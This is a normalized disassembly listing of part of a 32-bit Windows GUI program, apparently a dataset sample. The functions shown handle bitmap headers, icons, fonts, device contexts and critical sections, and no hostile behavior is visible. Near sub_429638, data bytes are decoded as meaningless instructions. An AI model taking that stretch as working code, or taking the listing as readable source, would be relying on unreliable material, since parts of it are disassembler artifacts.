mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42683c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422b88
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42874c
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a4c
call sub_403aa0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_42683c
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428784
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4279a0
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_4273ac
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4287e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c84
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_42791c
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425d38
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41abcc
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41abcc
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c84
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4277e0
mov dl [ r-xdata ]
call sub_424bf4
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424f0c
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4268f8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41abcc
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41abcc
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41abcc
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41abcc
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41abcc
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41abcc
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_42537c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41abcc
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4256a0
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_428aa0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4279a0
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_426944
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_428b1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_426fa8
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428b40
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_428b88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426074
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_426770
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_428bdc
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_426774
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b20
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_428c0c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_428ee4
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_426770
mov eax [ esi + 0x28 ]
call sub_426774
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418b4c
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_428c6c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_424bf4
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_428cc4
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_428d00
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41a988
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41ab94
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_42594c
jmp r-xdata
jmp r-xdata
call sub_424e04
sub_428d78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428e05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_428cc4
cmp eax [ rw-data ]
jne r-xdata
call sub_424e04
mov eax esi
call sub_428cc4
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425e78
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c84
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41abcc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428e2c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428eba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41a968
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41ab94
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41ab94
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_428ee4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_424e04
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428ebf
mov eax [ ebp - 0x4 ]
call sub_403270
call sub_403a4c
call sub_403aa0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428ee4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428f24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_426770
mov eax [ ebx + 0x28 ]
call sub_426774
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428fa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_428d78
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41abcc
pop esi
pop ebx
retn
sub_428ff4
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_42544c
mov [ rw-data ] eax
pop ebx
retn
sub_42902c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429070
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42902c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42913c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_429174
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_42936c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4291b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4291a0
xor eax eax
push ebp
push sub_429259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429260
mov eax [ ebp - 0x4 ]
call sub_4291ac
retn
mov eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42926c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42926c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427218
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42934b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4277e0
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424200
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4240e4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416f14
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_42477c
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424ad8
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42749c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42936c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4291a0
xor eax eax
push ebp
push sub_4293b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293be
mov eax [ ebp - 0x4 ]
call sub_4291ac
retn
mov esp ebp
pop ebp
retn
sub_4293be
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403270
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4291a0
xor eax eax
push ebp
push sub_4293b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4293be
mov eax [ ebp - 0x4 ]
call sub_4291ac
retn
mov esp ebp
pop ebp
retn
sub_4293e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423458
push eax
mov eax ebx
call sub_423458
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_4291b8
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42941c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4294e5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4294ec
retn
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
call sub_426454
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
call sub_403270
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a64
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a64
sub_4294f0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_428ff4
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429070
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c10
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c10
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422c10
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42913c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187bc
mov [ rw-data ] eax
mov ecx sub_423468
mov edx sub_423478
mov eax [ sub_421ed8 ]
call sub_417d10
mov ecx r-xdata
mov edx sub_423680
mov eax [ r-xdata ]
call sub_417d10
sub_4295fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429621
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429628
retn
sub_429638
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
xchg esi eax
inc edx
add [ eax + eax ] dl
add [ eax ] al
fcomp [ ebp + 0x41 ]
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add ah dl
add [ ecx ] 0x78
test [ ecx ] eax
mov esp 0x28004297
test [ ecx ] al
movsb [ edi ] [ esi ]
test [ ecx ] al
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
xchg edi eax
inc edx
call sub_42d937
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
xchg esi eax
inc edx
add [ eax ] cl
add [ eax ] al
add al bl
adc [ eax ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + ebx * 4 + 0x42 ] al
add [ edx + ebp - 0x6777ffc0 ] ch
inc edx
add [ eax + ebx * 4 + 0x42 ] dh
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4187b8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ esi + edx * 4 + 0x34a00042 ] bl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + ebx * 4 + 0x42 ] al
add [ eax - 0x77ffbd68 ] ch
cwde
inc edx
add [ eax + ebx * 4 + 0x42 ] dh
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x5000408d
xchg edi eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x42 ] bl
mov eax edi
call sub_403270
sub_429764
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4297bc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_4187b8
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403270
sub_429800
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_429844
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_429888
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418440
mov eax esi
pop esi
pop ebx
retn
sub_4298b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4298d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298e0
retn
sub_4298f4
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_429954
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4298f4
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_429a44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429a80
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429aa5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429aac
retn
sub_429ab8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404498
xor eax eax
push ebp
push sub_429b77
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
